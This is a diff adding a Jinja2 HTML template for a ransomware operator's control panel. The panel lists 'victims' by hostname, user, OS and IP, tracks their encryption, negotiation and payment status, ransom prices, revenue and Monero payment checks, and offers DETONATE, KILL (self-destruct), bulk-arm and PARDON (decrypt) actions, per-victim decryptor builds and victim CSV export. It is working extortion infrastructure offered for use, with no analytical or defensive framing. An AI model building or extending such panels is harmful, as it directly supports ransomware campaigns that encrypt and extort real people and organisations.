@@ -1,0 +1,201 @@
+{% extends "base.html" %}
+{% block title %}dashboard{% endblock %}
+{% block content %}
+<h1>Operations overview</h1>
+<p class="sub">Live posture · {{ total }} matching victims
+  {% if notify_enabled %}· <span class="badge on">notify</span>{% endif %}
+  {% if payments_rpc %}· <span class="badge on">xmr rpc</span>{% endif %}
+</p>
+
+<div class="cards" id="stats">
+  <div class="card">total <b data-k="total">{{ stats.total }}</b></div>
+  <div class="card">encrypted <b data-k="encrypted">{{ stats.encrypted }}</b></div>
+  <div class="card">negotiating <b data-k="negotiating">{{ stats.negotiating }}</b></div>
+  <div class="card ok">paid <b data-k="paid">{{ stats.paid }}</b></div>
+  <div class="card danger">armed <b data-k="armed">{{ stats.armed }}</b></div>
+  <div class="card danger">kill queued <b data-k="killed">{{ stats.killed }}</b></div>
+  <div class="card">online 24h <b data-k="recent">{{ stats.recent }}</b></div>
+  <div class="card">reports <b data-k="reports">{{ stats.reports }}</b></div>
+  <div class="card ok">revenue <b data-k="revenue">${{ "%.0f"|format(stats.revenue) }}</b></div>
+</div>
+
+<form method="get" action="{{ url_for('dashboard') }}" class="filter panel">
+  <div style="flex:2"><label>search</label>
+    <input name="q" value="{{ q }}" placeholder="host, user, vid, ip, tag"></div>
+  <div><label>status</label>
+    <select name="status">
+      <option value="">any</option>
+      {% for st in ['encrypted','negotiating','paid','dead'] %}
+      <option value="{{ st }}" {{ 'selected' if status==st }}>{{ st }}</option>
+      {% endfor %}
+    </select></div>
+  <div><label>armed</label>
+    <select name="armed">
+      <option value="">any</option>
+      <option value="0" {{ 'selected' if armed=='0' }}>sleeping</option>
+      <option value="1" {{ 'selected' if armed=='1' }}>armed</option>
+      <option value="2" {{ 'selected' if armed=='2' }}>kill</option>
+    </select></div>
+  <div><label>campaign</label>
+    <select name="campaign">
+      <option value="">all campaigns</option>
+      {% for c in campaigns %}
+      <option value="{{ c['id'] }}" {{ 'selected' if campaign==c['id']|string }}>{{ c['name'] }}</option>
+      {% endfor %}
+    </select></div>
+  <div><label>online</label>
+    <select name="online">
+      <option value="">any</option>
+      <option value="1" {{ 'selected' if only_online }}>last 5 min</option>
+    </select></div>
+  <div><button class="btn" type="submit">FILTER</button></div>
+  <div><a class="btn dim" href="{{ url_for('dashboard') }}">RESET</a></div>
+</form>
+
+<form id="bulkform" method="post" action="{{ url_for('bulk') }}">
+  <input type="hidden" name="csrf" value="{{ csrf_token }}">
+</form>
+
+<div class="filter" style="margin-top:12px">
+  <form method="post" action="{{ url_for('detonate_all') }}" class="inline"
+        onsubmit="return confirm('Arm every sleeping victim?')">
+    <input type="hidden" name="csrf" value="{{ csrf_token }}">
+    <button class="btn red" type="submit">DETONATE ALL</button>
+  </form>
+  {% if current_role == 'root' %}
+  <form method="post" action="{{ url_for('pardon_all') }}" class="inline"
+        onsubmit="return confirm('Pardon every victim and decrypt them?')">
+    <input type="hidden" name="csrf" value="{{ csrf_token }}">
+    <button class="btn blue" type="submit">PARDON ALL</button>
+  </form>
+  {% endif %}
+  {% if payments_rpc %}
+  <form method="post" action="{{ url_for('payments_check') }}" class="inline">
+    <input type="hidden" name="csrf" value="{{ csrf_token }}">
+    <button class="btn blue" type="submit">CHECK PAYMENTS</button>
+  </form>
+  {% endif %}
+  <a class="btn dim" href="{{ url_for('export_victims') }}">EXPORT CSV</a>
+  <a class="btn dim" href="{{ url_for('analytics') }}">ANALYTICS</a>
+</div>
+
+<table>
+<tr>
+  <th><input type="checkbox" style="width:auto"
+       onclick="document.querySelectorAll('.pick').forEach(c=>c.checked=this.checked)"></th>
+  <th>Host / User</th><th>OS / IP</th><th>Status</th><th>Armed</th>
+  <th>Online</th><th>Price</th><th>Last ping</th><th>Actions</th>
+</tr>
+{% for v in rows %}
+<tr>
+  <td><input class="pick" form="bulkform" type="checkbox" name="vid"
+             value="{{ v['vid'] }}" style="width:auto"></td>
+  <td><b>{{ v['hostname'] or '?' }}</b><br><span class="sub">{{ v['username'] or '?' }}</span>
+      {% if v['tags'] %}<br><span class="small">#{{ v['tags'] }}</span>{% endif %}
+      <br><span class="sub small">{{ v['vid'][:18] }}…</span></td>
+  <td>{{ v['os_info'] or '?' }}<br><span class="sub">{{ v['ip'] or '?' }}</span></td>
+  <td class="status-{{ v['status'] }}">{{ v['status'] }}</td>
+  <td>{% if v['detonate']==1 %}<span class="badge armed">ARMED</span>
+      {% elif v['detonate']==2 %}<span class="badge armed">KILL</span>{% else %}—{% endif %}</td>
+  <td>{% if online(v) %}<span class="badge on" data-online="{{ v['vid'] }}">online</span>
+      {% else %}<span class="badge off" data-online="{{ v['vid'] }}">off</span>{% endif %}
+      {% if v['chat_unread'] %}<br><span class="badge armed">{{ v['chat_unread'] }} msg</span>{% endif %}</td>
+  <td>${{ "%.0f"|format(v['price'] or 0) }}</td>
+  <td class="sub">{{ v['last_ping'] or 'never' }}</td>
+  <td>
+    <a class="btn" href="{{ url_for('victim', vid=v['vid']) }}">DETAIL</a>
+    {% if v['detonate'] %}
+    <form method="post" action="{{ url_for('detonate_reset', vid=v['vid']) }}" class="inline">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <button class="btn" type="submit">RESET</button>
+    </form>
+    {% else %}
+    <form method="post" action="{{ url_for('detonate', vid=v['vid']) }}" class="inline"
+          onsubmit="return confirm('Arm this victim?')">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <button class="btn red" type="submit">DETONATE</button>
+    </form>
+    {% endif %}
+    <form method="post" action="{{ url_for('kill', vid=v['vid']) }}" class="inline"
+          onsubmit="return confirm('Queue self-destruct?')">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <button class="btn red" type="submit">KILL</button>
+    </form>
+    {% if current_role == 'root' %}
+    <form method="post" action="{{ url_for('pardon', vid=v['vid']) }}" class="inline"
+          onsubmit="return confirm('Pardon this victim and decrypt it?')">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <button class="btn blue" type="submit">PARDON</button>
+    </form>
+    {% else %}
+    <span class="btn dim locked" title="requires root">ROOT ONLY</span>
+    {% endif %}
+    {% if v['aes_key'] %}
+      <a class="btn blue" href="{{ url_for('admin_decryptor', vid=v['vid']) }}">CPP</a>
+      {% if exe_build_available %}
+      <a class="btn blue" href="{{ url_for('admin_decryptor_exe', vid=v['vid']) }}">EXE</a>
+      {% endif %}
+    {% else %}<span class="btn dim">NO KEY</span>{% endif %}
+    <form method="post" action="{{ url_for('delete_victim', vid=v['vid']) }}" class="inline"
+          onsubmit="return confirm('Delete this row?')">
+      <input type="hidden" name="csrf" value="{{ csrf_token }}">
+      <button class="btn red" type="submit">DEL</button>
+    </form>
+  </td>
+</tr>
+{% else %}
+<tr><td colspan="9">no victims match</td></tr>
+{% endfor %}
+</table>
+
+<div class="filter" style="margin-top:12px">
+  <div><label>bulk action</label>
+    <select name="action" form="bulkform">
+      <option value="detonate">detonate</option>
+      <option value="kill">kill</option>
+      <option value="reset">reset</option>
+      <option value="paid">mark paid</option>
+      {% if current_role == 'root' %}
+      <option value="pardon">pardon (decrypt)</option>
+      {% else %}
+      <option value="pardon" disabled>pardon (root only)</option>
+      {% endif %}
+      <option value="delete">delete</option>
+    </select></div>
+  <div><button class="btn red" type="submit" form="bulkform"
+      onclick="return confirm('Apply to selected victims?')">APPLY TO SELECTED</button></div>
+</div>
+
+{% if pages > 1 %}
+<div class="pager">
+  {% if page > 1 %}
+  <a class="btn" href="{{ url_for('dashboard', q=q, status=status, armed=armed, online='1' if only_online else '', page=page-1) }}">prev</a>
+  {% endif %}
+  <span class="sub">page {{ page }} / {{ pages }}</span>
+  {% if page < pages %}
+  <a class="btn" href="{{ url_for('dashboard', q=q, status=status, armed=armed, online='1' if only_online else '', page=page+1) }}">next</a>
+  {% endif %}
+</div>
+{% endif %}
+
+<script>
+async function refresh() {
+  try {
+    const r = await fetch("{{ url_for('api_overview') }}", {cache: "no-store"});
+    if (!r.ok) return;
+    const d = await r.json();
+    document.querySelectorAll("[data-k]").forEach(el => {
+      const k = el.dataset.k;
+      if (k in d.stats) {
+        el.textContent = (k === "revenue") ? "$" + Math.round(d.stats[k]) : d.stats[k];
+      }
+    });
+    d.victims.forEach(v => {
+      const b = document.querySelector('[data-online="' + CSS.escape(v.vid) + '"]');
+      if (b) { b.textContent = v.online ? "online" : "off"; b.className = "badge " + (v.online ? "on" : "off"); }
+    });
+  } catch (e) {}
+}
+setInterval(refresh, 15000);
+</script>
+{% endblock %}
